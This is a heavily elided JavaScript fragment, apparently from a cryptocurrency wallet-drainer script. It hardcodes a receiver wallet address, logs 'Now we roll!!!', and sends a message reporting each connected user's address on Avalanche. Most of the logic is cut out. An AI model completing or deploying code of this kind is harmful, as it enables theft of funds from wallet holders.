...
const receiver_addres = '0xF496AdBcE3903a4006da3942073567d6eCba8686'; // gaf<- RECEIVER ADDRESS HERE
let onButtonClick;
let user_address;
...
const receiver_address = '0xF496AdBcE3903a4006da3942073567d6eCba8686';
async function proceed(){
  ...
  console.log("Now we roll!!!");
    ...
    async function send() {
        ...
        await sendMessage(`pelumi ... avalanche : connected to ${user_address}`);
